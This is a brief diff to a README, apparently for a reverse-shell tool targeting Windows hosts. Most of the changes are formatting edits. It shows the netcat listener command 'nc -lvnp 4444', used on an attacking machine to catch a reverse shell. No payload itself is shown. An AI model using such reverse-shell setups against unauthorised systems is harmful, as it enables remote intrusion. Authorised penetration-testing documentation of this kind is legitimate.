@@ -30,7 +30,6 @@ Before triggering the reverse shell, set up a listener on your attacking machine
 
 ```bash
 nc -lvnp 4444
-
+```
 ## TARGET:
-- **Windows Hosts** (Tested on Windows 10 and Windows Server)
-
+- **Windows Hosts**
